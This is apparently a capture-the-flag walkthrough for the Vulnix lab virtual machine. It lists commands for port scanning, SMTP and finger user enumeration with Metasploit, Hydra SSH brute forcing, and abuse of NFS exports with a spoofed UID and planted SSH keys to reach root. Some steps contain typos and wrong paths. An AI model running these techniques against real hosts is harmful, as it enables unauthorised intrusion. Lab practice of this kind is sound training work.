Description:

Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!)
The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. The details are as follows:

Architecture: x86
Format: VMware (vmx & vmdk) compatibility with version 4 onwards
RAM: 512MB
Network: NAT
Extracted size: 820MB

THE GOAL:
boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish.


Scan the whole network using Nmap
To Identify Vulnix Box IP. { sudo nmap -A <ip address/24>}
Enumeration
Enumeration is an important part of pentesting, debatable to be the most important step. In this step we’ll be enumeration services running on victim as well as users.

1.1 Services Enumeration
You don’t usually need to scan all ports, top 1000 are usually good for starting, but in this example all ports will be scanned for TCP services.

Great, we got many services running, notables are:

>Port 22: SSH
>Port 25: SMTP
>Port 79: Finger
>Port 110: POP3
>Port 111: RPCbind
>Port 143: IMAP
>Port 512: RSH (Remote shell)
>Port 513: RLogin
>Port 514: shell?

1.2 Port 22 — Inspecting SSH — OpenSSH 5.9p1

Now we check for exploit on the searchxploite and found nothing useful there so moving on.

Enumerating users using metasploit
search auxiliary/scanner/smtp/smtp_enum
set rhost <ip address>
run/exploit

Enumeration continuation using metasploit
search auxiliary/scanner/finger/finger_users
set rhost <ip address>
run/exploit

Brute forcing SSH 
Running Hydra against either user or vulnix is an option with rockyou wordlist, although this will take a very long time
hydra -l user -P rockyou.txt <ip address> ssh -t 4

Privilege escalation
Let's try to get the UID for vulnix and create a temporary user on our system and access it.
- sudo showmount -e <ip address>
- sudo mkdir /mnt/vulnix
- sudo mount <ip address>:/home/vulnix /mnt/vulnix -o vers=3

Add New User
- sudo adduser -u 2008 vulnix {create password vulnix}

Switch User to vulnix
- su vulnix

Now Create .ssh folder in /mnt/vulnix
- mkdir /mnt/vulnix/.ssh

So, let’s generate an ssh key by using builtin command ssh-keygen.
- ssh-keygen -t rsa

Navigate to .ssh folder in ~ directory where the generated keygen is located

Now copy id_rsa.pub as authorized_keys
- cp id_rsa.pub /mnt/vulnix/authorized_keys

Simply use ssh to login...
- ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@<ip address>

Once you are inside vulnix‒ run
- sudo -ll
- sudoedit /etc/exports- add  /root *(rw, no_root_squash)
- roboot vulnix box

on kali terminal
- sudo showmount -e <ip address> ‒ root user has been added
- sudo mkdir /mnt/vulnroot
- sudo mount <ip address>:root /mnt/vulnroot -o vers=3

Now generate keygen like we did on vulnix box
create .ssh folder in /mnt/vulnroot directory
- sudo mkdir mnt/vulnroot/.ssh

copy the generated keygen id_rsa.pub to /mnt/vulnroot/.ssh as authorized_keys
- sudo cp id_rsa.pub to /mnt/vulnroot/.ssh/authorized_keys

Now login to vulnix box as root with ssh
- ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa root@192.168.37.135

Once you gained access as root
ls
congratulations!!! you can now cat out trophy.txt
